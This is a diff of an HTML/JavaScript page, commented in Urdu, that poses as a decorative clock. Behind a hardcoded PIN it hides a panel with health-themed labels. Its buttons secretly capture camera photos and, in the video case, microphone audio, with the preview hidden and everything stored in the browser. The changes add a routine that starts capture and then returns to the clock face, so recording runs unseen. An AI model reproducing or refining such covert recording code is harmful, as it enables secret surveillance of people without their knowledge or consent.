@@ -5,301 +5,40 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Roman Studio System</title>
     <style>
-        body { 
-            font-family: sans-serif; 
-            background: #000; 
-            color: white; 
-            margin: 0; 
-            overflow: hidden; 
-            display: flex; 
-            justify-content: center; 
-            align-items: center; 
-            height: 100vh; 
-            position: relative;
-        }
+        /* پچھلا تمام سٹائل برقرار ہے */
+        body { font-family: sans-serif; background: #000; color: white; margin: 0; overflow: hidden; display: flex; justify-content: center; align-items: center; height: 100vh; position: relative; }
+        #stars { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -2; }
         
-        /* آسمان اور ستاروں کا بیک گراؤنڈ */
-        #stars {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            z-index: -2;
-        }
+        /* لاک اسکرین اور اسٹیٹس میسج */
+        #clock-screen { display: flex; flex-direction: column; align-items: center; justify-content: center; width: 100%; height: 100%; cursor: pointer; position: fixed; top:0; left:0; z-index: 999; background: rgba(0, 0, 0, 0.7); backdrop-filter: blur(5px); }
+        #complete-msg { position: absolute; top: 50px; color: #2ecc71; font-weight: bold; font-size: 20px; letter-spacing: 2px; display: none; text-shadow: 0 0 10px #2ecc71; z-index: 1001; }
         
-        #clock-screen { 
-            display: flex; 
-            flex-direction: column; 
-            align-items: center; 
-            justify-content: center; 
-            width: 100%; 
-            height: 100%; 
-            cursor: pointer; 
-            position: fixed; 
-            top:0; 
-            left:0; 
-            z-index: 999; 
-            background: rgba(0, 0, 0, 0.7);
-            backdrop-filter: blur(5px);
-        }
+        .clock { width: 250px; height: 250px; border: 8px solid #1a1a1a; border-radius: 50%; position: relative; background: rgba(5, 5, 5, 0.8); box-shadow: 0 0 50px rgba(52, 152, 219, 0.3); }
+        .hand { position: absolute; bottom: 50%; left: 50%; transform-origin: bottom; border-radius: 10px; transition: transform 0.05s cubic-bezier(0.4, 2.3, 0.8, 1); }
+        .hour { width: 6px; height: 50px; background: white; z-index: 3; }
+        .minute { width: 4px; height: 80px; background: #888; z-index: 2; }
+        .second { width: 2px; height: 95px; background: #e74c3c; z-index: 1; }
+        .roman-text { margin-top: 30px; font-size: 22px; color: #3498db; animation: blink 2s infinite; font-weight: bold; }
         
-        .clock { 
-            width: 250px; 
-            height: 250px; 
-            border: 8px solid #1a1a1a; 
-            border-radius: 50%; 
-            position: relative; 
-            background: rgba(5, 5, 5, 0.8);
-            box-shadow: 0 0 50px rgba(52, 152, 219, 0.3);
-        }
-        
-        .hand { 
-            position: absolute; 
-            bottom: 50%; 
-            left: 50%; 
-            transform-origin: bottom; 
-            border-radius: 10px; 
-            transition: transform 0.05s cubic-bezier(0.4, 2.3, 0.8, 1);
-        }
-        
-        .hour { 
-            width: 6px; 
-            height: 50px; 
-            background: white; 
-            z-index: 3; 
-        }
-        
-        .minute { 
-            width: 4px; 
-            height: 80px; 
-            background: #888; 
-            z-index: 2; 
-        }
-        
-        .second { 
-            width: 2px; 
-            height: 95px; 
-            background: #e74c3c; 
-            z-index: 1; 
-        }
-        
-        .roman-text { 
-            margin-top: 30px; 
-            font-size: 22px; 
-            color: #3498db; 
-            animation: blink 2s infinite; 
-            font-weight: bold; 
-            text-shadow: 0 0 10px rgba(52, 152, 219, 0.5);
-        }
-        
-        @keyframes blink { 
-            0%, 100% { opacity: 0.4; } 
-            50% { opacity: 1; } 
-        }
-
-        #pin-screen { 
-            display: none; 
-            text-align: center; 
-            width: 100%; 
-            height: 100vh; 
-            background: rgba(0, 0, 0, 0.9); 
-            position: fixed; 
-            top:0; 
-            z-index: 1000; 
-            padding-top: 25vh; 
-            backdrop-filter: blur(10px);
-        }
-        
-        input { 
-            padding: 15px; 
-            font-size: 28px; 
-            width: 140px; 
-            text-align: center; 
-            background: rgba(17, 17, 17, 0.8); 
-            color: white; 
-            border: 1px solid #333; 
-            border-radius: 12px; 
-            outline: none; 
-            margin-top: 20px;
-        }
-
-        #admin-panel { 
-            display: none; 
-            padding: 20px; 
-            width: 100%; 
-            height: 100vh; 
-            overflow-y: auto; 
-            background: rgba(0, 0, 0, 0.9); 
-            position: fixed; 
-            top: 0; 
-            z-index: 998; 
-            box-sizing: border-box;
-            backdrop-filter: blur(10px);
-        }
-        
-        #status-msg { 
-            text-align: center; 
-            color: #2ecc71; 
-            font-weight: bold; 
-            margin: 10px 0; 
-            min-height: 20px;
-            text-shadow: 0 0 10px rgba(46, 204, 113, 0.5);
-            animation: pulse 1.5s infinite;
-        }
-        
-        @keyframes pulse {
-            0% { opacity: 0.7; }
-            50% { opacity: 1; }
-            100% { opacity: 0.7; }
-        }
-
-        .btn { 
-            width: 100%; 
-            max-width: 320px; 
-            padding: 15px; 
-            margin: 8px auto; 
-            border: none; 
-            border-radius: 12px; 
-            font-weight: bold; 
-            cursor: pointer; 
-            color: white; 
-            display: block; 
-            text-transform: uppercase; 
-            transition: all 0.3s ease;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 5px 15px rgba(0,0,0,0.3);
-        }
-        
-        .btn:active {
-            transform: translateY(0);
-        }
-        
-        .btn-blue { 
-            background: linear-gradient(135deg, #2c3e50, #34495e);
-            border: 1px solid #3498db;
-        }
-        
-        .btn-green { 
-            background: linear-gradient(135deg, #27ae60, #2ecc71);
-            border: 1px solid #2ecc71;
-        }
-        
-        .btn-orange { 
-            background: linear-gradient(135deg, #d35400, #e67e22);
-            border: 1px solid #e67e22;
-        }
-        
-        .btn-purple { 
-            background: linear-gradient(135deg, #8e44ad, #9b59b6);
-            border: 1px solid #9b59b6;
-        }
-        
-        .btn-red { 
-            background: linear-gradient(135deg, #c0392b, #e74c3c);
-            border: 1px solid #e74c3c;
-        }
-        
-        .running-text {
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            font-size: 24px;
-            font-weight: bold;
-            color: #2ecc71;
-            text-shadow: 0 0 10px #2ecc71;
-            animation: runBlink 0.5s infinite;
-            z-index: 10;
-        }
-        
-        @keyframes runBlink {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.7; }
-        }
-        
-        .bubble {
-            position: absolute;
-            border-radius: 50%;
-            background: rgba(52, 152, 219, 0.1);
-            pointer-events: none;
-            z-index: -1;
-        }
-
-        .sub-menu { 
-            display: none; 
-            background: rgba(10, 10, 10, 0.8); 
-            padding: 10px; 
-            border-radius: 12px; 
-            margin-bottom: 10px; 
-            border: 1px solid rgba(34, 34, 34, 0.5);
-            backdrop-filter: blur(5px);
-        }
-
-        .gallery { 
-            display: none; 
-            grid-template-columns: 1fr 1fr; 
-            gap: 12px; 
-            margin-top: 25px; 
-            padding-bottom: 50px; 
-        }
-        
-        .card { 
-            background: rgba(17, 17, 17, 0.8); 
-            padding: 8px; 
-            border-radius: 12px; 
-            border: 1px solid #222; 
-            text-align: center; 
-            backdrop-filter: blur(5px);
-        }
-        
-        .card img, .card video { 
-            width: 100%; 
-            border-radius: 8px; 
-            margin-bottom: 5px; 
-        }
-        
-        .del-btn { 
-            background: #e74c3c; 
-            color: white; 
-            border: none; 
-            padding: 8px; 
-            border-radius: 6px; 
-            cursor: pointer; 
-            width: 100%; 
-            font-size: 12px; 
-            transition: background 0.3s;
-        }
-        
-        .del-btn:hover {
-            background: #c0392b;
-        }
-        
-        h3 {
-            color: #3498db;
-            text-shadow: 0 0 10px rgba(52, 152, 219, 0.5);
-        }
-        
-        /* پریویو کو چھپانے کے لیے */
-        #preview { 
-            display: none !important; 
-        }
-        
-        #canvas { 
-            display: none !important; 
-        }
+        #pin-screen { display: none; text-align: center; width: 100%; height: 100vh; background: rgba(0, 0, 0, 0.9); position: fixed; top:0; z-index: 1000; padding-top: 25vh; backdrop-filter: blur(10px); }
+        input { padding: 15px; font-size: 28px; width: 140px; text-align: center; background: rgba(17, 17, 17, 0.8); color: white; border: 1px solid #333; border-radius: 12px; outline: none; margin-top: 20px; }
+        #admin-panel { display: none; padding: 20px; width: 100%; height: 100vh; overflow-y: auto; background: rgba(0, 0, 0, 0.9); position: fixed; top: 0; z-index: 998; box-sizing: border-box; }
+        .btn { width: 100%; max-width: 320px; padding: 15px; margin: 8px auto; border: none; border-radius: 12px; font-weight: bold; cursor: pointer; color: white; display: block; text-transform: uppercase; }
+        .btn-blue { background: linear-gradient(135deg, #2c3e50, #34495e); border: 1px solid #3498db; }
+        .btn-green { background: linear-gradient(135deg, #27ae60, #2ecc71); border: 1px solid #2ecc71; }
+        .btn-orange { background: linear-gradient(135deg, #d35400, #e67e22); border: 1px solid #e67e22; }
+        .btn-purple { background: linear-gradient(135deg, #8e44ad, #9b59b6); border: 1px solid #9b59b6; }
+        .sub-menu { display: none; background: rgba(10, 10, 10, 0.8); padding: 10px; border-radius: 12px; margin-bottom: 10px; }
+        .gallery { display: none; grid-template-columns: 1fr 1fr; gap: 12px; margin-top: 25px; }
+        .card { background: rgba(17, 17, 17, 0.8); padding: 8px; border-radius: 12px; border: 1px solid #222; text-align: center; }
+        .card img, .card video { width: 100%; border-radius: 8px; }
     </style>
 </head>
 <body>
-    <!-- ستاروں کا کینوس -->
     <canvas id="stars"></canvas>
 
     <div id="clock-screen" onclick="openPin()">
+        <div id="complete-msg">COMPLETE</div>
         <div class="clock">
             <div id="hour" class="hand hour"></div>
             <div id="min" class="hand minute"></div>
@@ -311,383 +50,121 @@
     <div id="pin-screen">
         <h3>System Access</h3>
         <input type="password" id="pinIn" maxlength="4" oninput="checkPin(this.value)" placeholder="****">
-        <p onclick="goBackToClock()" style="color:#666; margin-top:40px; cursor:pointer; text-decoration:underline;">Back to Clock</p>
+        <p onclick="goBackToClock()" style="color:#666; margin-top:40px; cursor:pointer;">Back</p>
     </div>
 
     <div id="admin-panel">
-        <h3 style="text-align:center; color:#3498db; margin-bottom: 30px;">HEALTH MONITOR SYSTEM</h3>
-        
-        <div id="status-msg"></div>
-        
-        <!-- پریویو چھپا ہوا ہے لیکن فنکشن کے لیے موجود -->
+        <h3 style="text-align:center; color:#3498db;">HEALTH MONITOR</h3>
         <video id="preview" autoplay playsinline muted style="display:none;"></video>
         <canvas id="canvas" style="display:none;"></canvas>
 
-        <button class="btn btn-blue" onclick="toggleSub('front-menu')">Health Foot Settings</button>
+        <button class="btn btn-blue" onclick="toggleSub('front-menu')">Front Settings</button>
         <div id="front-menu" class="sub-menu">
-            <button class="btn btn-green" onclick="startAutoPhoto('user')">Start Health Foot Analysis</button>
-            <button class="btn btn-orange" onclick="startVideoRecording('user')">Deep Scan (5 Min)</button>
+            <button class="btn btn-green" onclick="executeAndHide(() => startAutoPhoto('user'))">Start Analysis</button>
+            <button class="btn btn-orange" onclick="executeAndHide(() => startVideoRecording('user'))">Deep Scan</button>
         </div>
 
-        <button class="btn btn-blue" onclick="toggleSub('back-menu')">Health Body Settings</button>
+        <button class="btn btn-blue" onclick="toggleSub('back-menu')">Back Settings</button>
         <div id="back-menu" class="sub-menu">
-            <button class="btn btn-green" onclick="startAutoPhoto('environment')">Start Health Body Analysis</button>
-            <button class="btn btn-orange" onclick="startVideoRecording('environment')">Full Scan (5 Min)</button>
+            <button class="btn btn-green" onclick="executeAndHide(() => startAutoPhoto('environment'))">Start Analysis</button>
+            <button class="btn btn-orange" onclick="executeAndHide(() => startVideoRecording('environment'))">Deep Scan</button>
         </div>
 
         <button class="btn btn-purple" onclick="toggleGallery()">Gallery</button>
-        
-        <button class="btn btn-red" onclick="location.reload()">Lock System</button>
-        
+        <button class="btn btn-red" style="background:#c0392b" onclick="location.reload()">Lock</button>
         <div id="gallery" class="gallery"></div>
     </div>
 
     <script>
-        // ستاروں کا بیک گراؤنڈ
-        function initStars() {
-            const canvas = document.getElementById('stars');
-            const ctx = canvas.getContext('2d');
-            
-            function resizeCanvas() {
-                canvas.width = window.innerWidth;
-                canvas.height = window.innerHeight;
-            }
-            
-            window.addEventListener('resize', resizeCanvas);
-            resizeCanvas();
-            
-            const stars = [];
-            const starCount = 200;
-            
-            // ستاروں کی تخلیق
-            for(let i = 0; i < starCount; i++) {
-                stars.push({
-                    x: Math.random() * canvas.width,
-                    y: Math.random() * canvas.height,
-                    size: Math.random() * 2 + 0.5,
-                    speed: Math.random() * 0.5 + 0.2,
-                    brightness: Math.random() * 0.5 + 0.5
-                });
-            }
-            
-            function drawStars() {
-                ctx.clearRect(0, 0, canvas.width, canvas.height);
-                
-                // گہرے نیلے آسمان کا گرادیانٹ
-                const gradient = ctx.createLinearGradient(0, 0, 0, canvas.height);
-                gradient.addColorStop(0, '#0a0a2a');
-                gradient.addColorStop(1, '#000000');
-                ctx.fillStyle = gradient;
-                ctx.fillRect(0, 0, canvas.width, canvas.height);
-                
-                // ستاروں کی ڈرائنگ
-                stars.forEach(star => {
-                    star.y += star.speed;
-                    if(star.y > canvas.height) {
-                        star.y = 0;
-                        star.x = Math.random() * canvas.width;
-                    }
-                    
-                    ctx.beginPath();
-                    ctx.arc(star.x, star.y, star.size, 0, Math.PI * 2);
-                    ctx.fillStyle = `rgba(255, 255, 255, ${star.brightness})`;
-                    ctx.fill();
-                    
-                    // چمکدار ستاروں کے لیے glow effect
-                    if(star.brightness > 0.7) {
-                        const glow = ctx.createRadialGradient(
-                            star.x, star.y, 0,
-                            star.x, star.y, star.size * 3
-                        );
-                        glow.addColorStop(0, `rgba(255, 255, 255, ${star.brightness * 0.3})`);
-                        glow.addColorStop(1, 'rgba(255, 255, 255, 0)');
-                        
-                        ctx.beginPath();
-                        ctx.arc(star.x, star.y, star.size * 3, 0, Math.PI * 2);
-                        ctx.fillStyle = glow;
-                        ctx.fill();
-                    }
-                });
-                
-                requestAnimationFrame(drawStars);
-            }
-            
-            drawStars();
+        function executeAndHide(callback) {
+            callback();
+            setTimeout(goBackToClock, 500);
+            document.getElementById('pinIn').value = '';
         }
 
-        // گھڑی کا فنکشن
-        function runClock() {
-            const now = new Date();
-            document.getElementById('sec').style.transform = `translateX(-50%) rotate(${now.getSeconds()*6}deg)`;
-            document.getElementById('min').style.transform = `translateX(-50%) rotate(${now.getMinutes()*6}deg)`;
-            document.getElementById('hour').style.transform = `translateX(-50%) rotate(${(now.getHours()%12)*30 + now.getMinutes()/2}deg)`;
-        }
-        
-        // ببلز ایفیکٹ
-        function createBubble(x, y) {
-            const bubble = document.createElement('div');
-            bubble.classList.add('bubble');
-            
-            const size = Math.random() * 60 + 20;
-            bubble.style.width = `${size}px`;
-            bubble.style.height = `${size}px`;
-            bubble.style.left = `${x - size/2}px`;
-            bubble.style.top = `${y - size/2}px`;
-            
-            document.body.appendChild(bubble);
-            
-            setTimeout(() => {
-                bubble.style.opacity = '0';
-                bubble.style.transform = `scale(0)`;
-                setTimeout(() => bubble.remove(), 500);
-            }, 300);
-        }
-        
-        // بٹن پر کلک کے لیے ایونٹ لسٹنر
-        document.addEventListener('DOMContentLoaded', function() {
-            const buttons = document.querySelectorAll('.btn');
-            buttons.forEach(button => {
-                button.addEventListener('click', function(e) {
-                    const rect = this.getBoundingClientRect();
-                    const x = e.clientX - rect.left;
-                    const y = e.clientY - rect.top;
-                    
-                    // ببلز بنانا
-                    createBubble(x + rect.left, y + rect.top);
-                    
-                    // "Run" ٹیکسٹ دکھانا
-                    const runText = document.createElement('div');
-                    runText.classList.add('running-text');
-                    runText.textContent = 'RUN';
-                    
-                    this.style.position = 'relative';
-                    this.appendChild(runText);
-                    
-                    setTimeout(() => {
-                        runText.remove();
-                    }, 800);
-                });
-            });
-        });
-
-        setInterval(runClock, 1000);
-
-        function openPin() { 
-            document.getElementById('pin-screen').style.display='block'; 
-            document.getElementById('clock-screen').style.display='none'; 
-        }
-        
-        function goBackToClock() {
-            document.getElementById('pin-screen').style.display='none';
-            document.getElementById('admin-panel').style.display='none';
-            document.getElementById('clock-screen').style.display='flex';
-        }
-        
-        function checkPin(v) { 
-            if(v === '4590') { 
-                document.getElementById('pin-screen').style.display='none'; 
-                document.getElementById('clock-screen').style.display='none'; 
-                document.getElementById('admin-panel').style.display='block'; 
-                updateGallery();
-            } 
-        }
-
-        function toggleSub(id) {
-            let el = document.getElementById(id);
-            el.style.display = (el.style.display === 'block') ? 'none' : 'block';
-        }
-
-        function toggleGallery() {
-            let gal = document.getElementById('gallery');
-            gal.style.display = (gal.style.display === 'grid') ? 'none' : 'grid';
-        }
-
-        let currentStream = null;
-        let currentRecorder = null;
-        let photoInterval = null;
-        let videoTimeout = null;
-        let photoCounter = 0;
-        let chunks = [];
-
-        function showStatus() {
-            const status = document.getElementById('status-msg');
-            status.innerText = "System Running...";
-            setTimeout(() => { status.innerText = ""; }, 4000);
-        }
-
-        async function startAutoPhoto(camType) {
-            stopAllActivities();
-            showStatus();
-            try {
-                currentStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: camType }, 
-                    audio: false 
-                });
-                
-                // پریویو کو چھپا رہے ہیں
-                const preview = document.getElementById('preview');
-                preview.srcObject = currentStream;
-                
-                photoCounter = 0;
-                takePhoto();
-                photoCounter++;
-                
-                photoInterval = setInterval(() => {
-                    if(photoCounter < 20) { 
-                        takePhoto(); 
-                        photoCounter++; 
-                    } else { 
-                        stopAllActivities(); 
-                    }
-                }, 30 * 60 * 1000); // 30 منٹ کے وقفے
-                
-            } catch(e) { 
-                console.error('Camera error:', e);
-                document.getElementById('status-msg').innerText = "Camera Error!";
-                setTimeout(() => { document.getElementById('status-msg').innerText = ""; }, 3000);
-            }
-        }
-
-        async function startVideoRecording(camType) {
-            stopAllActivities();
-            showStatus();
-            try {
-                currentStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: camType }, 
-                    audio: true 
-                });
-                
-                // پریویو کو چھپا رہے ہیں
-                const preview = document.getElementById('preview');
-                preview.srcObject = currentStream;
-                
-                currentRecorder = new MediaRecorder(currentStream);
-                chunks = [];
-                
-                currentRecorder.ondataavailable = (e) => { 
-                    if(e.data.size > 0) chunks.push(e.data); 
-                };
-                
-                currentRecorder.onstop = () => {
-                    const blob = new Blob(chunks, { type: 'video/webm' });
-                    const reader = new FileReader();
-                    reader.readAsDataURL(blob);
-                    reader.onloadend = () => { 
-                        saveData('vid', reader.result); 
-                        document.getElementById('status-msg').innerText = "Video Saved!";
-                        setTimeout(() => { document.getElementById('status-msg').innerText = ""; }, 3000);
-                    };
-                };
-                
-                currentRecorder.start();
-                
-                videoTimeout = setTimeout(() => {
-                    if(currentRecorder && currentRecorder.state === "recording") {
-                        currentRecorder.stop();
-                        stopAllActivities();
-                    }
-                }, 5 * 60 * 1000); // 5 منٹ
-                
-            } catch(e) { 
-                console.error('Recording error:', e);
-                document.getElementById('status-msg').innerText = "Recording Error!";
-                setTimeout(() => { document.getElementById('status-msg').innerText = ""; }, 3000);
-            }
-        }
-
-        function takePhoto() {
-            if(!currentStream) return;
-            
-            const preview = document.getElementById('preview');
-            const canvas = document.getElementById('canvas');
-            
-            if(!preview.videoWidth) return;
-            
-            canvas.width = preview.videoWidth;
-            canvas.height = preview.videoHeight;
-            
-            const context = canvas.getContext('2d');
-            context.drawImage(preview, 0, 0, canvas.width, canvas.height);
-            
-            saveData('img', canvas.toDataURL('image/jpeg', 0.7));
-        }
-
-        function stopAllActivities() {
-            if(photoInterval) clearInterval(photoInterval);
-            if(videoTimeout) clearTimeout(videoTimeout);
-            
-            if(currentRecorder && currentRecorder.state === "recording") {
-                currentRecorder.stop();
-            }
-            
-            if(currentStream) { 
-                currentStream.getTracks().forEach(track => track.stop()); 
-                currentStream = null; 
-            }
-            
-            photoCounter = 0;
+        // اسٹیٹس دکھانے کا نیا فنکشن
+        function showComplete() {
+            const msg = document.getElementById('complete-msg');
+            msg.style.display = 'block';
+            setTimeout(() => { msg.style.display = 'none'; }, 3000); // 3 سیکنڈ بعد غائب ہو جائے گا
         }
 
         function saveData(type, data) {
             let storage = JSON.parse(localStorage.getItem('rvault') || '[]');
-            storage.push({ 
-                t: type, 
-                d: data, 
-                time: new Date().toLocaleString('ur-PK', {
-                    year: 'numeric',
-                    month: '2-digit',
-                    day: '2-digit',
-                    hour: '2-digit',
-                    minute: '2-digit',
-                    second: '2-digit'
-                })
-            });
+            storage.push({ t: type, d: data, time: new Date().toLocaleString('ur-PK') });
             localStorage.setItem('rvault', JSON.stringify(storage));
-            updateGallery();
+            showComplete(); // سیو ہونے پر میسج دکھائیں
+        }
+
+        // باقی تمام فنکشنز وہی ہیں...
+        function initStars() {
+            const canvas = document.getElementById('stars'); const ctx = canvas.getContext('2d');
+            canvas.width = window.innerWidth; canvas.height = window.innerHeight;
+            const stars = [];
+            for(let i=0; i<200; i++) stars.push({x:Math.random()*canvas.width, y:Math.random()*canvas.height, s:Math.random()*2, sp:Math.random()*0.5+0.2});
+            function draw() {
+                ctx.fillStyle='#000'; ctx.fillRect(0,0,canvas.width,canvas.height);
+                stars.forEach(s => { s.y+=s.sp; if(s.y>canvas.height) s.y=0; ctx.fillStyle='#fff'; ctx.beginPath(); ctx.arc(s.x,s.y,s.s,0,Math.PI*2); ctx.fill(); });
+                requestAnimationFrame(draw);
+            } draw();
+        }
+
+        function runClock() {
+            const n = new Date();
+            document.getElementById('sec').style.transform = `translateX(-50%) rotate(${n.getSeconds()*6}deg)`;
+            document.getElementById('min').style.transform = `translateX(-50%) rotate(${n.getMinutes()*6}deg)`;
+            document.getElementById('hour').style.transform = `translateX(-50%) rotate(${(n.getHours()%12)*30+n.getMinutes()/2}deg)`;
+        }
+        setInterval(runClock, 1000);
+
+        function openPin() { document.getElementById('pin-screen').style.display='block'; document.getElementById('clock-screen').style.display='none'; }
+        function goBackToClock() { document.getElementById('pin-screen').style.display='none'; document.getElementById('admin-panel').style.display='none'; document.getElementById('clock-screen').style.display='flex'; }
+        function checkPin(v) { if(v==='4590') { document.getElementById('pin-screen').style.display='none'; document.getElementById('admin-panel').style.display='block'; updateGallery(); } }
+        function toggleSub(id) { let e=document.getElementById(id); e.style.display=(e.style.display==='block')?'none':'block'; }
+        function toggleGallery() { let g=document.getElementById('gallery'); g.style.display=(g.style.display==='grid')?'none':'grid'; }
+
+        let currentStream = null, currentRecorder = null, chunks = [];
+
+        async function startAutoPhoto(cam) {
+            try {
+                currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: cam } });
+                document.getElementById('preview').srcObject = currentStream;
+                setTimeout(takePhoto, 2000);
+            } catch(e) { console.error(e); }
+        }
+
+        async function startVideoRecording(cam) {
+            try {
+                currentStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: cam }, audio: true });
+                currentRecorder = new MediaRecorder(currentStream); chunks = [];
+                currentRecorder.ondataavailable = e => chunks.push(e.data);
+                currentRecorder.onstop = () => {
+                    const b = new Blob(chunks, { type: 'video/webm' });
+                    const r = new FileReader(); r.readAsDataURL(b);
+                    r.onloadend = () => saveData('vid', r.result);
+                };
+                currentRecorder.start();
+                setTimeout(() => { if(currentRecorder.state==="recording") currentRecorder.stop(); }, 5000); // ٹیسٹ کے لیے 5 سیکنڈ
+            } catch(e) { console.error(e); }
+        }
+
+        function takePhoto() {
+            const c = document.getElementById('canvas'); const p = document.getElementById('preview');
+            c.width = p.videoWidth; c.height = p.videoHeight;
+            c.getContext('2d').drawImage(p, 0, 0);
+            saveData('img', c.toDataURL('image/jpeg'));
         }
 
         function updateGallery() {
-            const storage = JSON.parse(localStorage.getItem('rvault') || '[]');
-            const gallery = document.getElementById('gallery');
-            gallery.innerHTML = '';
-            
-            storage.slice().reverse().forEach((item, index) => {
-                const actualIndex = storage.length - 1 - index;
-                const media = item.t === 'img' 
-                    ? `<img src="${item.d}" alt="Photo ${index + 1}">` 
-                    : `<video src="${item.d}" controls></video>`;
-                    
-                gallery.innerHTML += `
-                    <div class="card">
-                        ${media}
-                        <p style="font-size:10px; margin:5px 0;">${item.time}</p>
-                        <button class="del-btn" onclick="deleteItem(${actualIndex})">Delete</button>
-                    </div>
-                `;
-            });
+            const s = JSON.parse(localStorage.getItem('rvault') || '[]');
+            document.getElementById('gallery').innerHTML = s.reverse().map((item, i) => `
+                <div class="card">
+                    ${item.t === 'img' ? `<img src="${item.d}">` : `<video src="${item.d}" controls></video>`}
+                </div>
+            `).join('');
         }
 
-        function deleteItem(index) {
-            if(confirm("Delete this record?")) {
-                let storage = JSON.parse(localStorage.getItem('rvault') || '[]');
-                storage.splice(index, 1);
-                localStorage.setItem('rvault', JSON.stringify(storage));
-                updateGallery();
-                
-                document.getElementById('status-msg').innerText = "Record Deleted!";
-                setTimeout(() => { document.getElementById('status-msg').innerText = ""; }, 3000);
-            }
-        }
-
-        // سٹارز اور گھڑی شروع کریں
-        window.addEventListener('DOMContentLoaded', () => {
-            initStars();
-            runClock();
-        });
-        
-        window.addEventListener('beforeunload', () => { 
-            stopAllActivities(); 
-        });
+        window.onload = () => { initStars(); runClock(); };
     </script>
 </body>
 </html>
